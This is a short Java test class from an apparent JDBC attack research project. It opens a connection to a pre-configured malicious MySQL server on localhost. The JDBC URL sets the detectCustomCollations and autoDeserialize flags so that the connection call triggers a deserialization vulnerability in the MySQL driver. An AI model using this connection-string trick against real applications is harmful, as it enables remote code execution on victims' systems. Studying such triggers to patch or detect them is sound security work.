package org.su18.jdbc.attack.mysql;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

import java.sql.Connection;

/**
 * @author su18
 */
public class MysqlAttackTest {

	public static void main(String[] args) throws Exception {

		String CLASS_NAME = "com.mysql.jdbc.Driver";
		// 连接事先配置好的恶意服务器 cobar
		String URL = "jdbc:mysql://localhost:8066/dbtest?detectCustomCollations=true&autoDeserialize=true";

		Class.forName(CLASS_NAME);

		// getConnection 触发漏洞
		Connection connection = ConnectionUtil.getJDBCConnection(CLASS_NAME, URL);
		connection.close();
	}

}
